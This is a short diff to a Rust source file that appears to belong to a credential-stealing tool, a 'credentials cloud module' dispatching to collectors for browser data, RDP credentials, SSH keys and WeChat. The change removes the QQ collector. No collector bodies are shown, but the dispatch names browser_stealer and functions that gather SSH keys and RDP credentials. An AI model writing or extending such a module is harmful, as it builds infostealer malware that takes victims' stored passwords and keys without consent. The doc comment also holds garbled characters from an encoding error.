@@ -1,4 +1,4 @@
-//! Credentials cloud module 鈥?browsers, RDP, SSH, QQ/WeChat.
+//! Credentials cloud module 鈥?browsers, RDP, SSH, WeChat.
 #![allow(non_snake_case)]
 #![allow(clippy::upper_case_acronyms)]
 
@@ -48,7 +48,6 @@ fn dispatch(input: &str) -> String {
             browser_stealer::BrowserStealer::search(btype, keyword)
         }
         "wechat" => other_software::OtherSoftware::collect_wechat(),
-        "qq" => other_software::OtherSoftware::collect_qq(),
         "ssh" => ssh_keys::SshKeys::collect(),
         "rdp" => rdp_creds::RdpCreds::collect(),
         _ => format!(r#"{{"error":"unknown creds op '{}'"}}"#, op),
